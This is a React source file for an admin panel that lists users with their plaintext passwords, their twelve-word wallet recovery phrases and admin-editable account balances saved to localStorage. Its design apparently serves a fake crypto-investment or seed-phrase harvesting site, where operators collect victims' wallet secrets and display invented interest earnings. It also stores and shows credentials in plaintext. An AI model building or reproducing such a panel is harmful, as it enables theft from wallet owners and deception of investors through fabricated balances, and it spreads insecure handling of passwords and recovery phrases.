
import { useContext, useEffect, useState } from 'react'
import { AuthContext } from './AuthContext'

function fmt(v) {
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(Number(v) || 0)
}

function UserCard({ u, canEdit, onSave }) {
  const [showPassword, setShowPassword] = useState(false)
  const [editing, setEditing] = useState(false)
  const [form, setForm] = useState({
    initialBalance: u?.initialBalance || 0,
    interestEarned: u?.interestEarned || 0,
    totalBalance: u?.totalBalance || 0,
  })

  useEffect(() => {
    setForm({
      initialBalance: u?.initialBalance || 0,
      interestEarned: u?.interestEarned || 0,
      totalBalance: u?.totalBalance || 0,
    })
  }, [u])

  const created = u?.createdAt ? new Date(u.createdAt).toLocaleString() : '—'

  const save = () => {
    const updated = {
      ...u,
      initialBalance: Number(form.initialBalance) || 0,
      interestEarned: Number(form.interestEarned) || 0,
      totalBalance: Number(form.totalBalance) || 0,
    }
    onSave && onSave(updated)
    setEditing(false)
  }

  return (
    <div className="bg-[#070a11]/80 border border-white/5 rounded-lg p-4 shadow-sm">
      <div className="flex items-start justify-between gap-4">
        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <h3 className="text-lg font-semibold text-white">{u?.name || '—'}</h3>
          <p className="text-sm text-white/60">{u?.email || '—'}</p>
        </div>
        <div className="text-right ">
          <span className={`px-2 py-1 text-xs rounded ${u?.isAdmin ? 'bg-red-600 text-white' : 'bg-white/5 text-white/70'}`}>
            {u?.isAdmin ? 'Admin' : 'User'}
          </span>
        </div>
      </div>

      <div className="mt-3 grid grid-cols-1 gap-2 text-sm">
        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">Password:</span>{' '}
          <span className="text-white/60">{showPassword ? (u?.password || '—') : '••••••••'}</span>
          <button type="button" onClick={() => setShowPassword((s) => !s)} className="ml-3 text-xs text-red-400">
            {showPassword ? 'Hide' : 'Show'}
          </button>
        </div>

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">Created:</span>{' '}
          <span className="text-white/60">{created}</span>
        </div>

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">ID:</span>{' '}
          <span className="text-white/50 break-all text-xs">{u?.id}</span>
        </div>

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">12 Words:</span>
          {Array.isArray(u?.words) && u.words.length > 0 ? (
            <ol className="mt-2 grid grid-cols-2 sm:grid-cols-3 gap-2 list-decimal list-inside">
              {u.words.map((w, i) => (
                <li key={i} className="text-white/60 bg-white/5 px-2 py-1 rounded">{w}</li>
              ))}
            </ol>
          ) : (
            <div className="text-white/50 mt-1">No words</div>
          )}
        </div>

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <h4 className="text-sm font-medium text-white/80 mb-2">Asset Balances</h4>

          {!editing ? (
            <div className="flex flex-col sm:flex-row sm:items-center sm:gap-4">
              <div className="text-white/60">Initial: <span className='text-white font-medium'>{fmt(u?.initialBalance ?? 0)}</span></div>
              <div className="text-white/60">Interest: <span className='text-white font-medium'>{fmt(u?.interestEarned ?? 0)}</span></div>
              <div className="text-white/60">Total: <span className='text-white font-medium'>{fmt(u?.totalBalance ?? 0)}</span></div>
              {canEdit && (
                <button
                  onClick={() => {
                    setForm({
                      initialBalance: u?.initialBalance || 0,
                      interestEarned: u?.interestEarned || 0,
                      totalBalance: u?.totalBalance || 0,
                    })
                    setEditing(true)
                  }}
                  className="ml-auto px-3 py-1 bg-red-600 rounded mt-2 sm:mt-0"
                >
                  Edit
                </button>
              )}
            </div>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
              <label className='flex flex-col'>
                <span className='text-sm text-white/70 mb-1'>Initial Balance</span>
                <input className='p-2 bg-[#0b0f18] rounded border border-white/5' type='number' value={form.initialBalance} onChange={(e) => setForm({ ...form, initialBalance: e.target.value })} />
              </label>

              <label className='flex flex-col'>
                <span className='text-sm text-white/70 mb-1'>Interest Earned</span>
                <input className='p-2 bg-[#0b0f18] rounded border border-white/5' type='number' value={form.interestEarned} onChange={(e) => setForm({ ...form, interestEarned: e.target.value })} />
              </label>

              <label className='flex flex-col'>
                <span className='text-sm text-white/70 mb-1'>Total Balance</span>
                <input className='p-2 bg-[#0b0f18] rounded border border-white/5' type='number' value={form.totalBalance} onChange={(e) => setForm({ ...form, totalBalance: e.target.value })} />
              </label>

              <div className='sm:col-span-3 flex gap-2'>
                <button onClick={save} className='px-3 py-1 bg-green-600 rounded'>Save</button>
                <button onClick={() => { setEditing(false); setForm({ initialBalance: u?.initialBalance || 0, interestEarned: u?.interestEarned || 0, totalBalance: u?.totalBalance || 0 }) }} className='px-3 py-1 border border-white/10 rounded'>Cancel</button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

export default function AdminPanel({ adminUsers = [] }) {
  const { user } = useContext(AuthContext)
  const canEdit = !!user?.isAdmin
  const isError = typeof adminUsers === 'string'

  const [users, setUsers] = useState(Array.isArray(adminUsers) ? adminUsers : [])

  useEffect(() => {
    if (!isError && Array.isArray(adminUsers)) setUsers(adminUsers)
  }, [adminUsers])

  const saveUser = (updated) => {
    const next = users.map((u) => (u.id === updated.id ? updated : u))
    setUsers(next)

    // persist to localStorage
    try {
      const all = JSON.parse(localStorage.getItem('users') || '[]')
      const merged = all.map((u) => (u.id === updated.id ? updated : u))
      localStorage.setItem('users', JSON.stringify(merged))

      // update aggregated assets totals as well
      const totals = merged.reduce(
        (acc, cu) => {
          acc.initial += Number(cu.initialBalance) || 0
          acc.interest += Number(cu.interestEarned) || 0
          acc.total += Number(cu.totalBalance) || 0
          return acc
        },
        { initial: 0, interest: 0, total: 0 }
      )
      localStorage.setItem('assetsTotals', JSON.stringify(totals))
    } catch (e) {
      console.error('Failed to save updated user', e)
    }
  }

  return (
    <div className="pt-24 px-4">
      <div className="max-w-6xl mx-auto">
        <h1 className="text-4xl font-bold mb-6 text-center">Admin Panel</h1>

        <p className="text-white/60 !mb-6 text-center">List of users and details. Admins can edit per-user asset balances here.</p>

        <div className="bg-[#070a11]/90 backdrop-blur-lg border border-white/10 rounded-lg p-6">
          {isError ? (
            <p className="text-red-400">{adminUsers}</p>
          ) : users.length === 0 ? (
            <p className="text-white/60">No users found.</p>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {users.map((u) => (
                <UserCard key={u.id} u={u} canEdit={canEdit} onSave={saveUser} />
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}